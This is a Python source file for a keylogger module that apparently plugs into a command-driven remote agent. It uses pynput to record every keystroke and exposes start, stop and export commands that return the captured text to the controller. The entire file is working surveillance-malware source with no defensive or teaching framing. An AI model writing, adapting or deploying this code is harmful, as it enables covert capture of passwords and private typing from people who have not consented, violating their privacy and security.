from pydantic import BaseModel
from pynput.keyboard import Listener, Key
from ..commands import Command, ICommandModule, CommandResult
from typing import Optional


command_arg_map = {
    Command.START_KEYLOG: None,
    Command.STOP_KEYLOG: None,
    Command.EXPORT_KEYLOG_TEXT: None
}

class Keylog(ICommandModule):
    def __init__(self):
        self.keys = []
        self.listener: Optional[Listener] = None

    def on_press(self, key):
        self.keys.append(key)

    def start_keylog(self) -> CommandResult:
        if not self.listener:
            self.listener = Listener(on_press=self.on_press)
            self.listener.start()
            return CommandResult(success=True, result={"message":"Keylogger started."})
        return CommandResult(success=False, result={"message": "Keylogger is already running."})

    def stop_keylog(self) -> CommandResult:
        if self.listener and self.listener.running:
            self.listener.stop()
            self.listener = None
            return CommandResult(success=True, result={"message": "Keylogger stopped."})
        return CommandResult(success=False, result={"message": "Keylogger is not running."})

    def export_keylog_text(self) -> CommandResult:
        if self.keys:
            text = self.format_keys()
            self.keys = []
            return CommandResult(success=True, result={"message": "Keystrokes exported.", "text": text})
        return CommandResult(success=False, result={"message": "No keystrokes to export."})

    def format_keys(self) -> str:
        text = ""
        for key in self.keys:
            if str(key) == "Key.space":
                text += " "
            elif str(key) == "Key.enter":
                text += "\n"
            elif isinstance(key, Key):
                text += f" {str(key)} "
            else:
                text += str(key).replace("'", "")
        return text

    def run(self, command: Command, args: Optional[BaseModel] = None) -> CommandResult:
        command_map = {
            Command.START_KEYLOG: self.start_keylog,
            Command.STOP_KEYLOG: self.stop_keylog,
            Command.EXPORT_KEYLOG_TEXT: self.export_keylog_text,
        }

        if command in command_map:
            try:
                return command_map[command]()
            except Exception as e:
                return CommandResult(success=False, result={"message": f"Error executing command: {e}"})
        else:
            return CommandResult(success=False, result={"message":"Command not found in module."})
        


